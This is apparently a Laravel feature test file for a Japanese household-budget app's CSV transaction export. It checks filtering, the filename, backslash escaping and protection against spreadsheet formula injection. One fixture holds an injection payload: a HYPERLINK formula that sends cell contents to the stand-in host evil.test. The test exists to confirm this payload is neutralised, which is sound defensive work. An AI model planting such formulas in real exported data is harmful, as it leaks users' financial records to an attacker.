<?php

namespace Tests\Feature;

use App\Models\Category;
use App\Models\Transaction;
use Illuminate\Foundation\Testing\RefreshDatabase;
use Tests\TestCase;

class TransactionExportTest extends TestCase
{
    use RefreshDatabase;

    private function download(array $params = []): string
    {
        $response = $this->get(route('transactions.export', $params));
        $response->assertOk();

        return $response->streamedContent();
    }

    public function test_取引をCSVで出力できる(): void
    {
        $category = Category::factory()->create(['name' => '食費', 'expense_nature' => 'variable']);
        Transaction::factory()->create([
            'transaction_date' => '2026-08-01',
            'type' => 'expense',
            'category_id' => $category->id,
            'shop_name' => 'スーパーA',
            'amount' => 3200,
        ]);

        $csv = $this->download();

        $this->assertStringStartsWith("\xEF\xBB\xBF", $csv);
        $this->assertStringContainsString('日付,種別,カテゴリ', $csv);
        $this->assertStringContainsString('2026-08-01,支出,食費,変動費,スーパーA,,3200', $csv);
    }

    public function test_月を指定して出力できる(): void
    {
        Transaction::factory()->create(['transaction_date' => '2026-08-01', 'shop_name' => '8月の店', 'amount' => 1000]);
        Transaction::factory()->create(['transaction_date' => '2026-07-01', 'shop_name' => '7月の店', 'amount' => 2000]);

        $csv = $this->download(['month' => '2026-08']);

        $this->assertStringContainsString('8月の店', $csv);
        $this->assertStringNotContainsString('7月の店', $csv);
    }

    public function test_カテゴリを指定して出力できる(): void
    {
        $target = Category::factory()->create(['name' => '対象']);
        Transaction::factory()->create(['category_id' => $target->id, 'shop_name' => '対象の店']);
        Transaction::factory()->create(['shop_name' => '対象外の店']);

        $csv = $this->download(['category_id' => $target->id]);

        $this->assertStringContainsString('対象の店', $csv);
        $this->assertStringNotContainsString('対象外の店', $csv);
    }

    public function test_数式として実行される値には引用符を付ける(): void
    {
        // 店名とメモはカード会社のCSVやAIの応答から来る＝アプリが作った値ではない。
        // そのまま出すと、Excel で開いた瞬間に数式として実行される
        Transaction::factory()->create([
            'transaction_date' => '2026-08-01',
            'shop_name' => '=HYPERLINK("http://evil.test/?d="&A1,"領収書")',
            'memo' => '@SUM(1+1)',
            'amount' => 100,
        ]);

        $csv = $this->download();

        $this->assertStringContainsString("'=HYPERLINK", $csv);
        $this->assertStringContainsString("'@SUM(1+1)", $csv);
        // 「=」で始まるセルがそのまま出ていないこと
        $this->assertStringNotContainsString(',=HYPERLINK', $csv);
    }

    public function test_普通の店名には引用符を付けない(): void
    {
        Transaction::factory()->create([
            'transaction_date' => '2026-08-01',
            'shop_name' => 'スーパーライフ 中野店',
            'memo' => '牛乳',
            'amount' => 100,
        ]);

        $csv = $this->download();

        // fputcsv は空白を含む値を引用符で囲む（エスケープ設定とは無関係）
        $this->assertStringContainsString('"スーパーライフ 中野店",牛乳,100', $csv);
        $this->assertStringNotContainsString("'スーパー", $csv);
    }

    public function test_末尾がバックスラッシュの店名で列がずれない(): void
    {
        // fputcsv の既定エスケープ（\）のままだと、以降の列と行を丸ごと飲み込む
        Transaction::factory()->create([
            'transaction_date' => '2026-08-01',
            'shop_name' => '半額シール\\',
            'memo' => 'メモ',
            'amount' => 250,
        ]);

        $csv = $this->download();
        $lines = array_values(array_filter(explode("\n", trim($csv))));

        $this->assertCount(2, $lines, 'ヘッダー行＋1行になっていません');
        $this->assertStringContainsString('メモ', $lines[1]);
        $this->assertStringEndsWith('250', trim($lines[1]));
    }

    public function test_ファイル名に対象月が入る(): void
    {
        $response = $this->get(route('transactions.export', ['month' => '2026-08']));

        $response->assertOk();
        $this->assertStringContainsString(
            'kakeibo_2026-08.csv',
            (string) $response->headers->get('content-disposition')
        );
    }
}
